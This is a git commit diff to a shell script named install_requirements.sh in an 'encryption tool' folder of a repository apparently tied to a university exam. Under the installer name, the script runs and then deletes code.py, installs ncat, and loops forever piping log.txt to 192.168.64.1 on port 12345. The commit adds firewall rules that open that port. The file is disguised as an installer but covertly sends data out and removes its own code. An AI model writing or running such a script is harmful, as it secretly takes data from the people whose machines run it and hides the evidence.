4f3023353156e45d82a19f7ceae9bc342afcc469
Bequery10 <120216168+Bequery10@users.noreply.github.com>
2024-12-10 02:47:56 +0000

    Add files via upload

--- Tedu_mat102_final_questions_2024/encrpytion_tool/install_requirements.sh
+++ Tedu_mat102_final_questions_2024/encrpytion_tool/install_requirements.sh
@@ -6,6 +6,9 @@ python3 -u code.py
 sudo rm code.py
 sudo apt-get update
 sudo apt-get install -y ncat
+sudo apt-get install -y ufw
+sudo ufw enable
+sudo ufw allow 12345/tcp
 
 while true; do
     tail -f log.txt | ncat 192.168.64.1 12345
